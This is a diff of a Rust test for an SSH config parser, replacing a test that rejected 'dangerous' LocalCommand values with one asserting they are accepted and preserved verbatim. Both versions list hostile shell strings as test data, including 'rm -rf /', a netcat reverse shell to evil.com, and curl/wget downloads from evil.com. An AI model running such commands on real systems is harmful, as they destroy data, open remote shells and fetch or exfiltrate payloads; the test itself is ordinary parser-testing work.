@@ -87,26 +87,28 @@ Host test5
 }
 
 #[test]
-fn test_parse_local_command_security() {
-    // Commands with dangerous patterns should fail
-    let dangerous_commands = vec![
-        "LocalCommand echo test; rm -rf /",
-        "LocalCommand echo $(whoami)",
-        "LocalCommand echo `date`",
-        "LocalCommand echo test | grep foo",
-        "LocalCommand echo test > /tmp/out",
-        "LocalCommand echo test & echo background",
-        "LocalCommand curl https://evil.com/malware -o /tmp/malware",
-        "LocalCommand wget https://evil.com/steal-data",
-        "LocalCommand nc -e /bin/sh evil.com 1234",
-        "LocalCommand rm -rf /important/data",
+fn test_parse_local_command_preserves_trusted_shell_grammar() {
+    let commands = [
+        "echo test; rm -rf /",
+        "echo $(whoami)",
+        "echo `date`",
+        "echo test | grep foo",
+        "echo test > /tmp/out",
+        "echo test & echo background",
+        "curl https://example.com/file -o /tmp/file",
+        "wget https://example.com/file",
+        "nc -e /bin/sh example.com 1234",
+        "rm -rf /important/data",
     ];
 
-    for cmd in dangerous_commands {
-        let config = format!("Host test\n    {cmd}\n");
-        assert!(
-            SshConfig::parse(&config).is_err(),
-            "Should reject dangerous command: {cmd}"
+    for command in commands {
+        let config = format!("Host test\n    LocalCommand {command}\n");
+        let parsed = SshConfig::parse(&config)
+            .unwrap_or_else(|error| panic!("trusted LocalCommand {command:?}: {error}"));
+        assert_eq!(
+            parsed.find_host_config("test").local_command.as_deref(),
+            Some(command),
+            "trusted shell grammar must be preserved exactly"
         );
     }
 }
